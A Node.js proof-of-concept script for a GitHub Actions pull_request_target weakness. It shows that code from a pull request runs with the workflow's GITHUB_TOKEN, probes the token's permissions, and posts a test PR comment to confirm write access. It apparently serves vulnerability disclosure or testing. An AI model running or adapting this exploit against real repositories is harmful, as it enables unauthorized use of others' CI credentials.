// scripts/poc.mjs  (Node 20+; ESM)
// Proves attacker-controlled code runs, then tries to post a PR comment with GITHUB_TOKEN.
// If the token is read-only, you'll get 403; if write-enabled, you'll see 201 and a comment on the PR.

import fs from 'node:fs/promises';

const repo = process.env.GITHUB_REPOSITORY || ''; // "owner/repo"
const token = process.env.GITHUB_TOKEN || '';
const apiBase = process.env.GITHUB_API_URL || 'https://api.github.com';
const eventPath = process.env.GITHUB_EVENT_PATH;

console.log('PoC: attacker-controlled code executed in pull_request_target (prebuild)');

let prNumber;
try {
  const payloadRaw = await fs.readFile(eventPath, 'utf8');
  const payload = JSON.parse(payloadRaw);
  prNumber = payload?.pull_request?.number;
} catch (e) {
  console.log('Could not read PR number from event payload:', e.message);
}

if (!repo || !prNumber || !token) {
  console.log('Missing repo, PR number, or token; skipping write test.');
  process.exit(0);
}

// Optional read probe
try {
  const [owner, name] = repo.split('/');
  const gql = await fetch(`${apiBase}/graphql`, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${token}`,
      'User-Agent': 'poc-script',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      query: `query($owner:String!,$name:String!){
        viewer{login}
        repository(owner:$owner,name:$name){ viewerPermission }
      }`,
      variables: { owner, name }
    })
  });
  console.log('GraphQL probe status:', gql.status);
  const body = await gql.text();
  console.log('GraphQL probe body:', body.slice(0, 500));
} catch (e) {
  console.log('GraphQL probe failed:', e.message);
}

// Try to post a PR comment (harmless write)
try {
  const res = await fetch(`${apiBase}/repos/${repo}/issues/${prNumber}/comments`, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${token}`,
      'User-Agent': 'poc-script',
      'Content-Type': 'application/json',
      Accept: 'application/vnd.github+json'
    },
    body: JSON.stringify({
      body: '🔐 PoC: GITHUB_TOKEN write test from `pull_request_target`. If you see this, the token had write perms.'
    })
  });
  console.log('Comment POST status:', res.status);
  if (res.status === 201) {
    console.log('✅ Write confirmed: PR comment created.');
  } else if (res.status === 403) {
    console.log('🟡 Likely read-only token (403). No write perms.');
  } else {
    const t = await res.text();
    console.log('ℹ️ Unexpected response posting comment:', t.slice(0, 500));
  }
} catch (e) {
  console.log('Comment POST failed:', e.message);
}
